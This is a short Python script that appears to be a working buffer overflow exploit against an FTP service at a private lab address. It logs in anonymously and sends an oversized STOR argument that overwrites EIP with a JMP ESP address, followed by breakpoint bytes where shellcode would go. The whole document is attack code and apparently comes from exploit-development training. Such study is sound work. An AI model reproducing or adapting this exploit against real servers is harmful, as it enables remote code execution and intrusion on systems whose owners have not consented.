#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# This is the jump address that we want to place in the EIP:
# 77D8AF0A   FFE4             JMP ESP
# Flip the hex!!!!!!!!!

buffer = "\x41"*965 + "\x0A\xAF\xD8\x77" + "\x43"*16 + "\xcc"*1014

print "\nSending evil buffer..."
s.connect(('192.168.17.111',21))
data = s.recv(1024)
s.send('USER ftp' +'\r\n')
data = s.recv(1024)
s.send('PASS ftp' +'\r\n')
data = s.recv(1024)
s.send('STOR ' +buffer+'\r\n')
s.close()
